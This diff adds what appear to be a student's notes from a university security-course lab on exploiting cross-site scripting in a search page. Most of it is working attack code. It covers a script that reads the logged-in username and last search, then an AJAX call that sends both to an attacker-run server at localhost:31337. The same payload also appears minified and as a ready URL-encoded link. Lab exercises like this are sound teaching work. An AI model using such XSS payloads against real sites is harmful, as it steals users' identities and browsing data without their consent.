@@ -1,0 +1,37 @@
+to get the username -> document.getElementById('logged-in-user').innerHTML;
+ most recent search -> document.getElementById('history-list').childNodes[1].innerHTML
+
+notice that searching for <script> alert('hi') </script> creates an alert (XXS)
+
+so searching for something like:
+
+<script>
+setTimeout(function() {
+console.log(document.getElementById('logged-in-user').innerHTML);
+console.log(document.getElementById('history-list').childNodes[1].innerHTML);
+}, 1000);
+</script>
+
+Note: we have to do a setTimeout because of the way this loads.  history-list loads
+after our script so we have to wait for that to load or else we get a null.
+
+Now we use ajax to make a get request to our server
+
+<script>
+setTimeout(function() {
+
+url="http://localhost:31337/?stolen_user=" + document.getElementById('logged-in-user').innerHTML + "&last_search=" + document.getElementById('history-list').childNodes[1].innerHTML;
+
+$.get(url).done(function(resp) {
+console.log(resp);
+});
+
+}, 1000);
+</script>
+
+as a payload to just search (no newlines, spaces etc):
+<script>setTimeout(function(){url="http://localhost:31337/?stolen_user="+document.getElementById('logged-in-user').innerHTML+"&last_search="+document.getElementById('history-list').childNodes[1].innerHTML;$.get(url).done(function(resp){console.log(resp);});},1000);</script>
+as a url:
+https://project2.ecen4133.org/search?q=%3Cscript%3EsetTimeout%28function%28%29%7Burl%3D%22http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D%22%2Bdocument.getElementById%28%27logged-in-user%27%29.innerHTML%2B%22%26last_search%3D%22%2Bdocument.getElementById%28%27history-list%27%29.childNodes%5B1%5D.innerHTML%3B%24.get%28url%29.done%28function%28resp%29%7Bconsole.log%28resp%29%3B%7D%29%3B%7D%2C1000%29%3B%3C%2Fscript%3E
+
+we should have our most recent search and logged in user's name
